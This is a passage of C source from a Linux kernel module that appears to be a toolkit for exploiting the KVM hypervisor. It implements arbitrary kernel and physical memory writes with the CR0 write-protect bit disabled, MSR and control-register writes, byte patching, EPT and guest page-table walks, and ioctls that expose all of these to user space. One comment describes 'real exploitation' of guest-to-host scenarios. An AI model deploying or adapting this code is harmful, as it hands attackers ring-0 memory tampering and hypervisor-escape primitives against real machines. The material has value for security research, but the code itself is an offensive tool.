    dump->pde = pmd_val(*pmd);

    if (pmd_large(*pmd)) {
        /* 2MB page */
        dump->physical_addr = (pmd_val(*pmd) & PMD_MASK) | (virt_addr & ~PMD_MASK);
        dump->flags |= 0x02;  /* Large page flag */
        return 0;
    }

    pte = pte_offset_kernel(pmd, virt_addr);
    if (pte_none(*pte)) {
        return -EFAULT;
    }
    dump->pte = pte_val(*pte);
    dump->physical_addr = (pte_val(*pte) & PAGE_MASK) | (virt_addr & ~PAGE_MASK);

    return 0;
}
#endif

/* ========================================================================
 * Memory Write Implementations (Step 3)
 * ======================================================================== */

/* Write to kernel memory - handles write protection bypass */
static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
                                size_t size, int do_disable_wp)
{
    unsigned long orig_cr0 = 0;
    int ret = 0;

    if (!is_kernel_address(addr)) {
        printk(KERN_DEBUG "%s: Invalid kernel address for write: 0x%lx\n", 
               DRIVER_NAME, addr);
        return -EINVAL;
    }

#ifdef CONFIG_X86
    if (do_disable_wp) {
        /* Disable write protection */
        orig_cr0 = disable_wp();
    }
#endif

    /* Use memcpy for kernel memory writes (unsafe but for demo) */
    memcpy((void *)addr, buffer, size);
    ret = 0;

#ifdef CONFIG_X86
    if (do_disable_wp) {
        /* Restore write protection */
        restore_wp(orig_cr0);
    }
#endif

    if (ret) {
        printk(KERN_DEBUG "%s: write_kernel_memory failed at 0x%lx\n", 
               DRIVER_NAME, addr);
        return -EFAULT;
    }

    printk(KERN_INFO "%s: Wrote %zu bytes to kernel address 0x%lx\n",
           DRIVER_NAME, size, addr);

    return 0;
}

/* Write to physical memory using ioremap */
static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, 
                                  size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size;
    size_t remaining = size;
    size_t written = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));

        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) {
            printk(KERN_DEBUG "%s: ioremap failed for phys write 0x%lx\n",
                   DRIVER_NAME, phys_addr);
            return written > 0 ? 0 : -EFAULT;
        }

        memcpy_toio(mapped + offset, buffer + written, chunk_size);
        iounmap(mapped);

        written += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }

    printk(KERN_INFO "%s: Wrote %zu bytes to physical address 0x%lx\n",
           DRIVER_NAME, size, phys_addr - size);

    return 0;
}

/* Write to physical memory via PFN and kmap */
static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, 
                                   size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy;
    size_t written = 0;

    while (written < size) {
        if (!pfn_valid(pfn)) {
            printk(KERN_DEBUG "%s: Invalid PFN for write: 0x%lx\n", DRIVER_NAME, pfn);
            return written > 0 ? 0 : -EINVAL;
        }

        page = pfn_to_page(pfn);
        if (!page) {
            return written > 0 ? 0 : -EFAULT;
        }

        kaddr = kmap_atomic(page);
        if (!kaddr) {
            return written > 0 ? 0 : -ENOMEM;
        }

        to_copy = min(size - written, (size_t)(PAGE_SIZE - offset));
        memcpy(kaddr + offset, buffer + written, to_copy);
        kunmap_atomic(kaddr);

        written += to_copy;
        pfn++;
        offset = 0;
    }

    printk(KERN_INFO "%s: Wrote %zu bytes via PFN to physical 0x%lx\n",
           DRIVER_NAME, size, phys_addr);

    return 0;
}

/* Write to guest memory - for guest-to-host scenarios */
static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, 
                                   size_t size)
{
    /*
     * In real exploitation, we would:
     * 1. Find KVM's internal structures
     * 2. Locate guest memory mappings  
     * 3. Translate GPA to HVA
     * 4. Write to HVA
     *
     * For now, try physical memory write as fallback
     */
    printk(KERN_INFO "%s: Writing to guest GPA 0x%lx (size: %zu)\n",
           DRIVER_NAME, gpa, size);

    return write_physical_memory(gpa, buffer, size);
}

/* Write to guest memory via GFN */
static int write_guest_memory_gfn(unsigned long gfn, const unsigned char *buffer, 
                                   size_t size)
{
    unsigned long gpa = gfn << PAGE_SHIFT;
    return write_guest_memory_gpa(gpa, buffer, size);
}

#ifdef CONFIG_X86
/* Write MSR */
static int write_msr_safe(u32 msr, u64 value)
{
    u32 low = value & 0xFFFFFFFF;
    u32 high = value >> 32;
    int err;

    asm volatile("1: wrmsr\n"
                 "2:\n"
                 ".section .fixup,\"ax\"\n"
                 "3: mov %4, %0\n"
                 "   jmp 2b\n"
                 ".previous\n"
                 _ASM_EXTABLE(1b, 3b)
                 : "=r"(err)
                 : "c"(msr), "a"(low), "d"(high), "i"(-EIO), "0"(0));

    if (err) {
        printk(KERN_WARNING "%s: Failed to write MSR 0x%x\n", DRIVER_NAME, msr);
        return err;
    }

    printk(KERN_INFO "%s: Wrote MSR 0x%x = 0x%llx\n", DRIVER_NAME, msr, value);
    return 0;
}

/* Write CR register */
static int write_cr_register(int cr_num, unsigned long value, unsigned long mask)
{
    unsigned long current_val, new_val;

    if (mask == 0) {
        mask = ~0UL;  /* All bits */
    }

    switch (cr_num) {
        case 0:
            current_val = native_read_cr0();
            new_val = (current_val & ~mask) | (value & mask);
            asm volatile("mov %0, %%cr0" : : "r"(new_val) : "memory");
            printk(KERN_INFO "%s: CR0: 0x%lx -> 0x%lx\n", 
                   DRIVER_NAME, current_val, new_val);
            break;
        case 3:
            /* CR3 write triggers TLB flush - be careful */
            current_val = native_read_cr3();
            new_val = (current_val & ~mask) | (value & mask);
            asm volatile("mov %0, %%cr3" : : "r"(new_val) : "memory");
            printk(KERN_INFO "%s: CR3: 0x%lx -> 0x%lx (TLB flushed)\n",
                   DRIVER_NAME, current_val, new_val);
            break;
        case 4:
            current_val = native_read_cr4();
            new_val = (current_val & ~mask) | (value & mask);
            asm volatile("mov %0, %%cr4" : : "r"(new_val) : "memory");
            printk(KERN_INFO "%s: CR4: 0x%lx -> 0x%lx\n",
                   DRIVER_NAME, current_val, new_val);
            break;
        default:
            return -EINVAL;
    }

    return 0;
}
#endif

/* Memset for kernel memory */
static int memset_kernel_memory(unsigned long addr, unsigned char value, size_t size)
{
    unsigned char *buffer;
    int ret;

    buffer = kmalloc(size, GFP_KERNEL);
    if (!buffer) {
        return -ENOMEM;
    }

    memset(buffer, value, size);
    ret = write_kernel_memory(addr, buffer, size, 1);
    kfree(buffer);

    return ret;
}

/* Memset for physical memory */
static int memset_physical_memory(unsigned long phys_addr, unsigned char value, size_t size)
{
    unsigned char *buffer;
    int ret;

    buffer = kmalloc(size, GFP_KERNEL);
    if (!buffer) {
        return -ENOMEM;
    }

    memset(buffer, value, size);
    ret = write_physical_memory(phys_addr, buffer, size);
    kfree(buffer);

    return ret;
}

/* Patch bytes with verification */
static int patch_memory(unsigned long addr, const unsigned char *original,
                         const unsigned char *patch, size_t length,
                         int verify_original, int addr_type)
{
    unsigned char *current_bytes;
    int ret;

    if (length > 32) {
        return -EINVAL;
    }

    current_bytes = kmalloc(length, GFP_KERNEL);
    if (!current_bytes) {
        return -ENOMEM;
    }

    /* Read current bytes */
    if (addr_type == 0) {
        ret = read_kernel_memory(addr, current_bytes, length);
    } else {
        ret = read_physical_memory(addr, current_bytes, length);
    }

    if (ret < 0) {
        kfree(current_bytes);
        return ret;
    }

    /* Verify original bytes if requested */
    if (verify_original) {
        if (memcmp(current_bytes, original, length) != 0) {
            printk(KERN_WARNING "%s: Original bytes mismatch at 0x%lx\n",
                   DRIVER_NAME, addr);
            kfree(current_bytes);
            return -EILSEQ;  /* Illegal byte sequence */
        }
    }

    /* Apply patch */
    if (addr_type == 0) {
        ret = write_kernel_memory(addr, patch, length, 1);
    } else {
        ret = write_physical_memory(addr, patch, length);
    }

    kfree(current_bytes);
    return ret;
}

/* ========================================================================
 * Address Conversion Implementations (Step 4)
 * ======================================================================== */

/* Convert kernel virtual address to physical address */
static int convert_virt_to_phys(unsigned long virt_addr, struct virt_to_phys_request *req)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    unsigned long phys;

    req->virt_addr = virt_addr;
    req->phys_addr = 0;
    req->pfn = 0;
    req->offset = 0;
    req->status = -EFAULT;

    /* Check if it's a direct-mapped kernel address */
    if (virt_addr >= PAGE_OFFSET && virt_addr < (unsigned long)high_memory) {
        /* Direct mapping - simple conversion */
        phys = __pa(virt_addr);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->offset = phys & ~PAGE_MASK;
        req->status = 0;
        return 0;
    }

    /* Check if it's a vmalloc address - need page table walk */
    if (is_vmalloc_addr((void *)virt_addr)) {
        pgd = pgd_offset_k(virt_addr);
        if (pgd_none(*pgd) || pgd_bad(*pgd))
            return -EFAULT;

        p4d = p4d_offset(pgd, virt_addr);
        if (p4d_none(*p4d) || p4d_bad(*p4d))
            return -EFAULT;

        pud = pud_offset(p4d, virt_addr);
        if (pud_none(*pud))
            return -EFAULT;

        if (pud_large(*pud)) {
            /* 1GB page */
            phys = (pud_val(*pud) & PUD_MASK) | (virt_addr & ~PUD_MASK);
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = virt_addr & ~PUD_MASK;
            req->status = 0;
            return 0;
        }

        pmd = pmd_offset(pud, virt_addr);
        if (pmd_none(*pmd))
            return -EFAULT;

        if (pmd_large(*pmd)) {
            /* 2MB page */
            phys = (pmd_val(*pmd) & PMD_MASK) | (virt_addr & ~PMD_MASK);
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = virt_addr & ~PMD_MASK;
            req->status = 0;
            return 0;
        }

        pte = pte_offset_kernel(pmd, virt_addr);
        if (pte_none(*pte))
            return -EFAULT;

        phys = (pte_val(*pte) & PAGE_MASK) | (virt_addr & ~PAGE_MASK);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->offset = virt_addr & ~PAGE_MASK;
        req->status = 0;
        return 0;
    }

    /* Try virt_to_phys for other kernel addresses */
    if (virt_addr >= TASK_SIZE) {
        phys = virt_to_phys((void *)virt_addr);
        if (phys) {
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = phys & ~PAGE_MASK;
            req->status = 0;
            return 0;
        }
    }

    return -EFAULT;
}

/* Convert physical address to kernel virtual address */
static int convert_phys_to_virt(unsigned long phys_addr, struct phys_to_virt_request *req)
{
    req->phys_addr = phys_addr;
    req->virt_addr = 0;
    req->status = -EFAULT;

    if (req->use_ioremap) {
        /* Use ioremap for MMIO regions */
        void __iomem *mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (mapped) {
            req->virt_addr = (unsigned long)mapped + (phys_addr & ~PAGE_MASK);
            req->status = 0;
            /* Note: Caller must iounmap when done */
            return 0;
        }
    } else {
        /* Use phys_to_virt for RAM */
        if (phys_addr < (unsigned long)high_memory - PAGE_OFFSET) {
            req->virt_addr = (unsigned long)phys_to_virt(phys_addr);
            req->status = 0;
            return 0;
        }

        /* Try __va for higher addresses */
        req->virt_addr = (unsigned long)__va(phys_addr);
        if (virt_addr_valid(req->virt_addr)) {
            req->status = 0;
            return 0;
        }
    }

    return -EFAULT;
}

/* Convert HVA to PFN via page table walk */
static int convert_hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
{
    struct mm_struct *mm = current->mm;
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    unsigned long pfn;

    req->hva = hva;
    req->pfn = 0;
    req->status = -EFAULT;

    if (!mm) {
        mm = current->active_mm;
        if (!mm) {
            return -EINVAL;
        }
    }

    down_read(&mm->mmap_lock);

    pgd = pgd_offset(mm, hva);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        goto out;

    p4d = p4d_offset(pgd, hva);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        goto out;

    pud = pud_offset(p4d, hva);
    if (pud_none(*pud))
        goto out;

    if (pud_large(*pud)) {
        pfn = pud_pfn(*pud) + ((hva & ~PUD_MASK) >> PAGE_SHIFT);
        req->pfn = pfn;
        req->status = 0;
        goto out;
    }

    pmd = pmd_offset(pud, hva);
    if (pmd_none(*pmd))
        goto out;

    if (pmd_large(*pmd)) {
        pfn = pmd_pfn(*pmd) + ((hva & ~PMD_MASK) >> PAGE_SHIFT);
        req->pfn = pfn;
        req->status = 0;
        goto out;
    }

    pte = pte_offset_map(pmd, hva);
    if (!pte || pte_none(*pte)) {
        if (pte) pte_unmap(pte);
        goto out;
    }

    pfn = pte_pfn(*pte);
    req->pfn = pfn;
    req->status = 0;
    pte_unmap(pte);

out:
    up_read(&mm->mmap_lock);
    return req->status;
}

/* Convert PFN to HVA (via direct map) */
static int convert_pfn_to_hva(unsigned long pfn, unsigned long *hva)
{
    struct page *page;

    if (!pfn_valid(pfn)) {
        return -EINVAL;
    }

    page = pfn_to_page(pfn);
    if (!page) {
        return -EFAULT;
    }

    /* Return direct-mapped kernel address */
    *hva = (unsigned long)page_address(page);
    if (!*hva) {
        /* Page not directly mapped, try kmap */
        *hva = (unsigned long)kmap(page);
        if (*hva) {
            kunmap(page);  /* Temporary mapping */
        }
    }

    return *hva ? 0 : -EFAULT;
}

/* Simple GPA to GFN conversion */
static inline unsigned long gpa_to_gfn_local(unsigned long gpa)
{
    return gpa >> PAGE_SHIFT;
}

/* Simple GFN to GPA conversion */
static inline unsigned long gfn_to_gpa_local(unsigned long gfn)
{
    return gfn << PAGE_SHIFT;
}

/* Extract PFN from Shadow PTE (Intel EPT / AMD NPT format) */
static int spte_to_pfn_local(unsigned long spte, struct spte_to_pfn_request *req)
{
    req->spte = spte;
    req->pfn = 0;
    req->flags = 0;
    req->present = 0;
    req->writable = 0;
    req->executable = 0;
    req->status = 0;

    /* Check present bit */
    if (!(spte & 0x1)) {  /* Bit 0 = Present */
        req->status = -ENOENT;
        return -ENOENT;
    }
    req->present = 1;

    /* Extract PFN - bits 12-51 typically contain the physical address */
    req->pfn = (spte & 0x000FFFFFFFFFF000ULL) >> PAGE_SHIFT;

    /* Extract common flags */
    req->flags = spte & 0xFFF;  /* Lower 12 bits are flags */

    /* Check writable (bit 1) */
    req->writable = (spte >> 1) & 1;

    /* For EPT, bit 2 is execute; for NPT, NX is bit 63 */
    req->executable = (spte >> 2) & 1;  /* EPT format */

    return 0;
}

/* Walk EPT/NPT page tables to translate GPA to HPA */
static int walk_ept_tables(unsigned long eptp, unsigned long gpa, struct ept_walk_request *req)
{
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long phys;

    req->eptp = eptp;
    req->gpa = gpa;
    req->hpa = 0;
    req->pml4e = 0;
    req->pdpte = 0;
    req->pde = 0;
    req->pte = 0;
    req->page_size = 0;
    req->status = -EFAULT;

    /* Extract indices from GPA */
    pml4_idx = (gpa >> 39) & 0x1FF;
    pdpt_idx = (gpa >> 30) & 0x1FF;
    pd_idx = (gpa >> 21) & 0x1FF;
    pt_idx = (gpa >> 12) & 0x1FF;

    /* Get PML4 base from EPTP (bits 12-51) */
    pml4_base = eptp & 0x000FFFFFFFFFF000ULL;

    /* Read PML4 entry */
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped);
    iounmap(mapped);
    req->pml4e = pml4e;

    if (!(pml4e & 0x1)) {  /* Not present */
        return -ENOENT;
    }

    /* Get PDPT base */
    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;

    /* Read PDPT entry */
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped);
    iounmap(mapped);
    req->pdpte = pdpte;

    if (!(pdpte & 0x1)) {
        return -ENOENT;
    }

    /* Check for 1GB page (bit 7) */
    if (pdpte & 0x80) {
        phys = (pdpte & 0x000FFFFFC0000000ULL) | (gpa & 0x3FFFFFFF);
        req->hpa = phys;
        req->page_size = 1024 * 1024 * 1024;  /* 1GB */
        req->status = 0;
        return 0;
    }

    /* Get PD base */
    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;

    /* Read PD entry */
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped);
    iounmap(mapped);
    req->pde = pde;

    if (!(pde & 0x1)) {
        return -ENOENT;
    }

    /* Check for 2MB page (bit 7) */
    if (pde & 0x80) {
        phys = (pde & 0x000FFFFFFFE00000ULL) | (gpa & 0x1FFFFF);
        req->hpa = phys;
        req->page_size = 2 * 1024 * 1024;  /* 2MB */
        req->status = 0;
        return 0;
    }

    /* Get PT base */
    pt_base = pde & 0x000FFFFFFFFFF000ULL;

    /* Read PT entry */
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped);
    iounmap(mapped);
    req->pte = pte;

    if (!(pte & 0x1)) {
        return -ENOENT;
    }

    /* 4KB page */
    phys = (pte & 0x000FFFFFFFFFF000ULL) | (gpa & 0xFFF);
    req->hpa = phys;
    req->page_size = 4096;  /* 4KB */
    req->status = 0;

    return 0;
}

/* Translate GVA through guest page tables */
static int translate_gva_to_gpa(unsigned long gva, unsigned long cr3, 
                                 struct gva_translate_request *req)
{
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long gpa;

    req->gva = gva;
    req->gpa = 0;
    req->hva = 0;
    req->hpa = 0;
    req->cr3 = cr3;
    req->status = -EFAULT;

    /* Extract indices from GVA (4-level paging) */
    pml4_idx = (gva >> 39) & 0x1FF;
    pdpt_idx = (gva >> 30) & 0x1FF;
    pd_idx = (gva >> 21) & 0x1FF;
    pt_idx = (gva >> 12) & 0x1FF;

    /* Get PML4 base from CR3 */
    pml4_base = cr3 & 0x000FFFFFFFFFF000ULL;

    /* Read PML4 entry */
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped);
    iounmap(mapped);

    if (!(pml4e & 0x1)) {
        return -ENOENT;
    }

    /* Get PDPT base */
    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;

    /* Read PDPT entry */
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped);
    iounmap(mapped);

    if (!(pdpte & 0x1)) {
        return -ENOENT;
    }

    /* Check for 1GB page */
    if (pdpte & 0x80) {
        gpa = (pdpte & 0x000FFFFFC0000000ULL) | (gva & 0x3FFFFFFF);
        req->gpa = gpa;
        req->status = 0;
        return 0;
    }

    /* Get PD base */
    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;

    /* Read PD entry */
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped);
    iounmap(mapped);

    if (!(pde & 0x1)) {
        return -ENOENT;
    }

    /* Check for 2MB page */
    if (pde & 0x80) {
        gpa = (pde & 0x000FFFFFFFE00000ULL) | (gva & 0x1FFFFF);
        req->gpa = gpa;
        req->status = 0;
        return 0;
    }

    /* Get PT base */
    pt_base = pde & 0x000FFFFFFFFFF000ULL;

    /* Read PT entry */
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped);
    iounmap(mapped);

    if (!(pte & 0x1)) {
        return -ENOENT;
    }

    /* 4KB page */
    gpa = (pte & 0x000FFFFFFFFFF000ULL) | (gva & 0xFFF);
    req->gpa = gpa;
    req->status = 0;

    return 0;
}

/* Virtual to PFN conversion */
static int convert_virt_to_pfn(unsigned long virt_addr, unsigned long *pfn)
{
    struct virt_to_phys_request req;
    int ret;

    ret = convert_virt_to_phys(virt_addr, &req);
    if (ret == 0) {
        *pfn = req.pfn;
    }
    return ret;
}

/* Page struct to PFN */
static inline unsigned long page_to_pfn_local(struct page *page)
{
    return page_to_pfn(page);
}

/* PFN to Page struct */
static inline struct page *pfn_to_page_local(unsigned long pfn)
{
    if (!pfn_valid(pfn)) {
        return NULL;
    }
    return pfn_to_page(pfn);
}

/* ========================================================================
 * IOCTL Handler
 * ======================================================================== */

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    int i, count;

    switch (cmd) {
        /* ================================================================
         * Step 1: Symbol Operations
         * ================================================================ */

        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = lookup_kernel_symbol(req.name);
            req.description[0] = '\0';

            /* Add description if found in our database */
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (strcmp(kvm_symbols[i].name, req.name) == 0) {
                    strncpy(req.description, kvm_symbols[i].description,
                           sizeof(req.description) - 1);
                    break;
                }
            }

            if (copy_to_user((void __user *)arg, &req, sizeof(req))) {
                return -EFAULT;
            }

            return req.address ? 0 : -ENOENT;
        }

        case IOCTL_GET_SYMBOL_COUNT: {
            return copy_to_user((void __user *)arg, &kvm_symbol_count,
                               sizeof(kvm_symbol_count)) ? -EFAULT : 0;
        }

        case IOCTL_GET_SYMBOL_BY_INDEX: {
            unsigned int index;
            struct symbol_request req;

            if (copy_from_user(&index, (void __user *)arg, sizeof(index))) {
                return -EFAULT;
            }

            if (index >= kvm_symbol_count) {
                return -EINVAL;
            }

            /* Find the nth valid symbol */
            count = 0;
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address) {
                    if (count == index) {
                        break;
                    }
                    count++;
                }
            }

            if (kvm_symbols[i].name == NULL) {
                return -EINVAL;
            }

            strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = kvm_symbols[i].address;
            strncpy(req.description, kvm_symbols[i].description,
                   sizeof(req.description) - 1);
            req.description[sizeof(req.description) - 1] = '\0';

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_FIND_SYMBOL_BY_NAME: {
            struct symbol_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.name[MAX_SYMBOL_NAME - 1] = '\0';

            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, req.name)) {
                    strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                    req.name[MAX_SYMBOL_NAME - 1] = '\0';
                    req.address = kvm_symbols[i].address;
                    strncpy(req.description, kvm_symbols[i].description,
                           sizeof(req.description) - 1);
                    req.description[sizeof(req.description) - 1] = '\0';

                    return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
                }
            }

            return -ENOENT;
        }

        case IOCTL_GET_VMX_HANDLERS: {
            count = 0;
            for (i = 0; vmx_handlers[i].name != NULL; i++) {
                if (vmx_handlers[i].address) count++;
            }
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_GET_SVM_HANDLERS: {
            count = 0;
            for (i = 0; svm_handlers[i].name != NULL; i++) {
                if (svm_handlers[i].address) count++;
            }
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_SEARCH_SYMBOLS: {
            char pattern[MAX_SYMBOL_NAME];
            struct symbol_request results[16];
            int result_count = 0;

            if (copy_from_user(pattern, (void __user *)arg, sizeof(pattern))) {
                return -EFAULT;
            }
            pattern[MAX_SYMBOL_NAME - 1] = '\0';

            /* Search in KVM symbols */
            for (i = 0; kvm_symbols[i].name != NULL && result_count < 16; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, pattern)) {
                    strncpy(results[result_count].name, kvm_symbols[i].name,
                           MAX_SYMBOL_NAME - 1);
                    results[result_count].name[MAX_SYMBOL_NAME - 1] = '\0';
                    results[result_count].address = kvm_symbols[i].address;
                    strncpy(results[result_count].description,
                           kvm_symbols[i].description, 255);
                    results[result_count].description[255] = '\0';
                    result_count++;
                }
            }

            /* Search in VMX handlers */
            for (i = 0; vmx_handlers[i].name != NULL && result_count < 16; i++) {
                if (vmx_handlers[i].address && strstr(vmx_handlers[i].name, pattern)) {
                    strncpy(results[result_count].name, vmx_handlers[i].name,
                           MAX_SYMBOL_NAME - 1);
                    results[result_count].name[MAX_SYMBOL_NAME - 1] = '\0';
                    results[result_count].address = vmx_handlers[i].address;
                    snprintf(results[result_count].description, 256, "VMX exit handler");
                    result_count++;
                }
            }

            /* Search in SVM handlers */
            for (i = 0; svm_handlers[i].name != NULL && result_count < 16; i++) {
                if (svm_handlers[i].address && strstr(svm_handlers[i].name, pattern)) {
                    strncpy(results[result_count].name, svm_handlers[i].name,
                           MAX_SYMBOL_NAME - 1);
                    results[result_count].name[MAX_SYMBOL_NAME - 1] = '\0';
                    results[result_count].address = svm_handlers[i].address;
                    snprintf(results[result_count].description, 256, "SVM exit handler");
                    result_count++;
                }
            }

            if (copy_to_user((void __user *)arg, results,
                            sizeof(struct symbol_request) * result_count)) {
                return -EFAULT;
            }

            return result_count;
        }

        /* ================================================================
         * Step 2: Memory Read Operations
         * ================================================================ */

        case IOCTL_READ_KERNEL_MEM: {
            struct kernel_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {  /* Limit to 1MB */
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            ret = read_kernel_memory(req.kernel_addr, kbuf, req.length);

            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    kfree(kbuf);
                    return -EFAULT;
                }
            }

            kfree(kbuf);
            return ret;
        }

        case IOCTL_READ_PHYSICAL_MEM: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            ret = read_physical_memory(req.phys_addr, kbuf, req.length);

            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    kfree(kbuf);
                    return -EFAULT;
                }
            }

            kfree(kbuf);
            return ret;
        }

        case IOCTL_READ_PFN_DATA: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            ret = read_physical_via_pfn(req.phys_addr, kbuf, req.length);

            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    kfree(kbuf);
                    return -EFAULT;
                }
            }

            kfree(kbuf);
            return ret;
        }

        case IOCTL_READ_GUEST_MEM: {
            struct guest_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            switch (req.mode) {
                case 0:  /* GPA */
                    ret = read_guest_memory_gpa(req.gpa, kbuf, req.length);
                    break;
                case 1:  /* GVA - not implemented yet */
                    printk(KERN_WARNING "%s: GVA translation not implemented\n", DRIVER_NAME);
                    ret = -ENOSYS;
                    break;
                case 2:  /* GFN */
                    ret = read_guest_memory_gfn(req.gpa, kbuf, req.length);
                    break;
                default:
                    ret = -EINVAL;
            }

            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    kfree(kbuf);
                    return -EFAULT;
                }
            }

            kfree(kbuf);
            return ret;
        }

        case IOCTL_SCAN_MEMORY_REGION: {
            struct {
                struct mem_region region;
                struct mem_pattern pattern;
            } scan_req;
            unsigned long *results_buf;
            int max_results = 256;
            int found;

            if (copy_from_user(&scan_req, (void __user *)arg, sizeof(scan_req))) {
                return -EFAULT;
            }

            results_buf = kmalloc(max_results * sizeof(unsigned long), GFP_KERNEL);
            if (!results_buf) {
                return -ENOMEM;
            }

            found = scan_memory_region(&scan_req.region, &scan_req.pattern, 
                                        results_buf, max_results);

            if (found > 0 && scan_req.region.buffer) {
                size_t to_copy = min((size_t)(found * sizeof(unsigned long)), 
                                     scan_req.region.buffer_size);
                if (copy_to_user(scan_req.region.buffer, results_buf, to_copy)) {
                    kfree(results_buf);
                    return -EFAULT;
                }
            }

            kfree(results_buf);
            return found;
        }

        case IOCTL_FIND_MEMORY_PATTERN: {
            struct pattern_search_request req;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

